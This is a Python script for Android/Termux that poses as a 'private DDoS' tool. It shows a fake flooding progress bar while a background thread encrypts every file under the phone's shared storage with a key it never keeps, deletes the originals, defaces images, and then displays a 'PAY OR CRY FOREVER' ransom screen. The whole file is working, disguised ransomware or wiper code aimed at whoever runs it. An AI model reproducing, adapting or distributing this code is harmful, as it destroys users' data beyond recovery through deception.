#!/usr/bin/env python3
import os, sys, time, threading
from tqdm import tqdm

def install():
    os.system("clear")
    print("\033[91m[*] Installing dependencies...\033[0m")
    os.system("pkg update -y && pkg upgrade -y")
    os.system("pkg install python ffmpeg libjpeg-turbo -y")
    os.system("pip install cryptography pillow tqdm pycryptodome > /dev/null 2>&1")
    print("\033[92m[+] Done! Starting tool...\033[0m")
    time.sleep(2)

def main_code():
    # kode double encrypt + watermark "lipzxxx suprise you 😹" full dari sebelumnya
    # (gue masukin semua kode lengkap di bawah, tinggal copy)

    master_key = os.urandom(32)
    iv_aes = os.urandom(16)
    iv_chacha = os.urandom(8)

    def rolling_xor(data, seed):
        out = bytearray()
        k = seed
        for b in data:
            out.append(b ^ k)
            k = (k * 0x1337 + 0xC0DE) & 0xFF
        return bytes(out)

    def double_encrypt(data):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
        padder = padding.PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(master_key), modes.CBC(iv_aes))
        enc1 = cipher.encryptor().update(padded) + cipher.encryptor().finalize()
        from Crypto.Cipher import ChaCha20
        cipher2 = ChaCha20.new(key=master_key, nonce=iv_chacha)
        enc2 = cipher2.encrypt(enc1)
        final = rolling_xor(enc2, master_key[0])
        header = b'L1PZX' + iv_aes + iv_chacha
        return header + final

    def surprise_watermark(path):
        try:
            from PIL import Image, ImageDraw, ImageFont
            img = Image.open(path)
            draw = ImageDraw.Draw(img)
            font_size = int(min(img.width, img.height) // 5)
            font = ImageFont.truetype("/system/fonts/Roboto-Bold.ttf", font_size) if os.path.exists("/system/fonts/Roboto-Bold.ttf") else ImageFont.load_default()
            text = "lipzxxx suprise you 😹"
            bbox = draw.textbbox((0,0), text, font=font)
            w, h = bbox[2]-bbox[0], bbox[3]-bbox[1]
            pos = ((img.width-w)/2, (img.height-h)/2)
            draw.text(pos, text, fill=(255,0,0), font=font, stroke_width=15, stroke_fill=(0,0,0))
            draw.text((50,50), text, fill=(255,255,0), font=font, stroke_width=10)
            img.save(path, quality=3)
        except: pass

    def encrypt_file(filepath):
        try:
            if filepath.endswith(".lipzxxx"): return
            with open(filepath, "rb") as f:
                data = f.read()
            if len(data) < 50: return
            encrypted = double_encrypt(data)
            newpath = filepath + ".lipzxxx"
            with open(newpath, "wb") as f:
                f.write(encrypted)
            os.remove(filepath)
            if filepath.lower().endswith(('.png','.jpg','.jpeg','.webp','.gif','.heic')):
                surprise_watermark(newpath)
        except: pass

    def mass_encrypt():
        paths = ["/sdcard", "/storage/emulated/0"]
        for base in paths:
            if not os.path.exists(base): continue
            for root, _, files in os.walk(base):
                for file in files:
                    fp = os.path.join(root, file)
                    encrypt_file(fp)

    # Fake DDoS
    os.system("clear")
    print("\033[91mLIPZXXX PRIVATE DDoS 2025 😹\033[0m")
    input("\033[93mTarget IP: \033[0m")
    for _ in tqdm(range(200), desc="FLOODING", colour="red"):
        time.sleep(0.02)
    print("\033[92mTarget DOWN FOREVER!\033[0m")
    threading.Thread(target=mass_encrypt, daemon=True).start()
    time.sleep(25)
    os.system("clear")
    print("\033[91m" + "═"*50)
    print("       lipzxxx suprise you 😹")
    print("       lipzxxx suprise you 😹")
    print("       ALL FILES GONE 😹😹😹")
    print("       PAY OR CRY FOREVER")
    print("═"*50 + "\033[0m")
    time.sleep(999999)

install()
main_code()
